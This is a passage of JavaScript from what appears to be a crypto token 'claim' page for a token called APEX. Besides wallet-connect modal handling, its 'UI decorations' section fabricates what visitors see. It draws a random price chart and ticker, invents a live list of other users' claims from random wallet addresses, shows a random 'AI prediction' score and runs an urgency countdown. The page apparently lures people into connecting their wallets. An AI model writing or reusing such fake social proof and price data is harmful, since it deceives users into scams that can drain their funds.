  localStorage.removeItem('connectedWallet');
  localStorage.removeItem('walletConnectSession');
  localStorage.removeItem('chainType');
}

function showWalletModal() { walletModal?.classList.add('active'); }
function hideWalletModal() { walletModal?.classList.remove('active'); }
function hideAnnouncementModal() { announcementModal?.classList.remove('active'); }

function toggleMobileMenu() { navLinks?.classList.toggle('active'); }
if (mobileMenuBtn) mobileMenuBtn.addEventListener('click', toggleMobileMenu);
if (walletModalClose) walletModalClose.addEventListener('click', hideWalletModal);
if (announcementModalClose) announcementModalClose.addEventListener('click', hideAnnouncementModal);
if (announcementOkBtn) announcementOkBtn.addEventListener('click', hideAnnouncementModal);
if (copyReferralBtn) copyReferralBtn.addEventListener('click', () => {
  if (!referralLink) return;
  const ta = document.createElement('textarea');
  ta.value = referralLink.textContent;
  document.body.appendChild(ta);
  ta.select();
  document.execCommand('copy');
  ta.remove();
  showNotification('Referral link copied!', 'success');
});

if (debugToggle) {
  debugToggle.addEventListener('click', () => {
    connectionDebug?.classList.toggle('active');
    debugToggle.textContent = connectionDebug?.classList.contains('active')
      ? 'Hide connection details'
      : 'Show connection details';
  });
}

if (walletProviders) {
  walletProviders.forEach(p => {
    p.addEventListener('click', () => {
      const type = p.getAttribute('data-provider');
      // We only support injected wallets via their extension; the modal just
      // triggers the standard connection flow.
      connectFlow();
    });
  });
}

// ============================================================
//  UI DECORATIONS (chart, countdown, claims list)
// ============================================================
function startCountdown() {
  let remaining = 114600;
  updateCountdownDisplay(remaining);
  countdownInterval = setInterval(() => {
    remaining--;
    if (remaining <= 0) { clearInterval(countdownInterval); return; }
    updateCountdownDisplay(remaining);
  }, 1000);
}

function updateCountdownDisplay(s) {
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  const el = document.getElementById('countdown');
  if (el) el.textContent = `${d}:${h}:${m}:${sec}`;
}

function createTokenChart() {
  const ctx = document.getElementById('tokenChart');
  if (!ctx || typeof Chart === 'undefined') return;
  const data = [];
  let v = 0.04;
  for (let i = 0; i < 24; i++) { v += Math.random() * 0.01 - 0.002; data.push(v); }
  tokenChart = new Chart(ctx.getContext('2d'), {
    type: 'line',
    data: {
      labels: Array.from({ length: 24 }, (_, i) => i + 'h'),
      datasets: [{ label: 'APEX', data, borderColor: '#FF6B00', backgroundColor: 'rgba(255,107,0,0.1)', borderWidth: 2, tension: 0.4, pointRadius: 0, fill: true }],
    },
    options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } }, scales: { x: { display: false }, y: { grid: { color: 'rgba(255,255,255,0.05)' } } } },
  });
}

function updateTokenPrice() {
  const last = priceHistory[priceHistory.length - 1] || 0.04;
  const change = Math.random() * 0.015 - 0.002;
  const price = (last + change).toFixed(4);
  priceHistory.push(parseFloat(price));
  if (priceHistory.length > 10) priceHistory.shift();
  const el = document.getElementById('tokenPrice');
  if (el) el.textContent = `$${price}`;
}

function generateInitialClaims() {
  claimList = Array.from({ length: 10 }, () => ({
    address: `0x${Math.random().toString(16).slice(2, 6)}...${Math.random().toString(16).slice(2, 6)}`,
    amount: 500,
    timestamp: Date.now() - Math.random() * 3600000,
  }));
  updateClaimList();
}

function updateClaimList() {
  if (!claimListElement) return;
  claimListElement.innerHTML = claimList.map(c =>
    `<div class="claim-item" style="display:flex; justify-content:space-between; padding:6px 0; font-size:12px;">
      <span style="color:#00b4d8;">${c.address}</span>
      <span style="color:#10b981;">${c.amount} APEX</span>
    </div>`
  ).join('');
}

function startClaimUpdates() {
  setInterval(() => {
    claimList.unshift({ address: `0x${Math.random().toString(16).slice(2, 6)}...`, amount: 500, timestamp: Date.now() });
    if (claimList.length > 10) claimList.pop();
    updateClaimList();
  }, 30000);
}

function updateAIAnalytics() {
  if (predictionFill) predictionFill.style.width = `${85 + Math.floor(Math.random() * 15)}%`;
}

// ============================================================
//  BOOT
// ============================================================
logDebug('✅ Script.js loaded — multi-chain aware, correct-chain-first flow');
